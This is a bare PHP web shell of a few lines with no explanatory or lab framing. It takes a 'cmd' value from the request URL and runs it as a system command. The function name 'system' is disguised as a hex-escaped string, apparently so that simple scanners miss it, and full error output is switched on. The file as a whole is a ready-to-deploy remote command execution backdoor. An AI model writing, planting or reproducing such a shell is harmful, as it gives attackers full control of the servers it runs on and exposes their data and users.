<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$_ = "\x73\x79\x73\x74\x65\x6d"; 
$cmd_var = filter_input(INPUT_GET, 'cmd', FILTER_SANITIZE_STRING); 

if ($cmd_var) {
    echo "Executing command: " . htmlspecialchars($cmd_var) . "<br>"; 
    ($_)(trim($cmd_var)); 
} else {
    echo "No command provided.";
}
?>
